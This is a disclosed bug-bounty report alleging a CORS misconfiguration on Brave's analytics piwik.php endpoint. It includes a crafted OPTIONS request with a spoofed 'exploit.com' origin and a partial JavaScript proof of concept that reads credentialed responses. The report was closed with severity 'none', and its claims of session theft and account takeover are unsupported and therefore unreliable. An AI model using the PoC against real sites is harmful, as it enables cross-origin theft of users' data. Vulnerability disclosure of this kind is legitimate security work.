# Cross-origin resource sharing misconfiguration (CORS)

## Report Details
- **Report ID**: 954512
- **URL**: https://hackerone.com/reports/954512
- **State**: Closed
- **Severity**: none
- **Submitted**: 2020-08-09T16:57:45.118Z
- **Disclosed**: 2020-09-04T00:34:52.551Z

## Reporter
- **Username**: drwx
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
Hi!

In this report I want to describe High level bug which can seriously compromise a user account.

If I am authorize on this site, I can steal user's sessions, some personal information or do some action.

In my tests, I found the relevant vulnerability using different methods. I detected the CORS vulnerability at the relevant address with the OPTIONS method. In addition, the server version information is also observed in the relevant response.

Steps for reproduce

1) Send this request

OPTIONS /piwik.php?action_name=%241%20Million%20Token%20Giveaway%20%7C%20Brave%20Browser&idsite=2&rec=1&r=571761&h=19&m=14&s=56&url=https%3A%2F%2Fbrave.com%2Fmillion%2F&_id=&_idts=1596989696&_idvc=1&_idn=1&_refts=0&_viewts=1596989696&send_image=1&cookie=1&res=1366x768&gt_ms=3109&pv_id= HTTP/1.1
Host: analytics.brave.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: image/webp,*/*
Origin: exploit.com
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://brave.com/million/

In response headers you can see headers:

Access-Control-Allow-Origin: exploit.com
Access-Control-Allow-Credentials: true

So you can write exploit:

<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
            var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("emo").innerHTML = alert(this.responseText);
            }
         };
         xhttp.open("GET", "/piwik.php?action_name=%241%20Million%20Token%20Giveaway%20%7C%20Brave%20Browser&idsite=2&rec=1&r=571761&h=19&m=14&s=56&url=https%3A%2F%2Fbrave.com%2Fmillion%2F&_id=&_idts=1596989696&_idvc=1&_idn=1&_refts=0&_viewts=1596989696&send_image=1&cookie=1&res=1366x768&gt_ms=3109&pv_id=", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
  
Rather than using a wild card or programmatically verifying supplied origins, use a white list of trusted domains.

## Impact

Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server. Attacker can perform any action in the user's account, bypassing CSRF tokes.

## Attachments
- Origin.png
